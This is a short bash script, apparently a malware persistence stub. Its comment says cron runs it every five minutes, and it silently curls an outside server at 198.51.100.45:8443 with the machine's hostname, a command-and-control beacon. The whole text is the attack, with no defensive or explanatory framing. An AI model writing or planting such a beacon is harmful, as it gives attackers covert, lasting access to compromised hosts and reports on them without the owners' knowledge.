#!/bin/bash
# Persistence callback - runs every 5 minutes via cron
curl -s http://198.51.100.45:8443/beacon?h=$(hostname) > /dev/null 2>&1
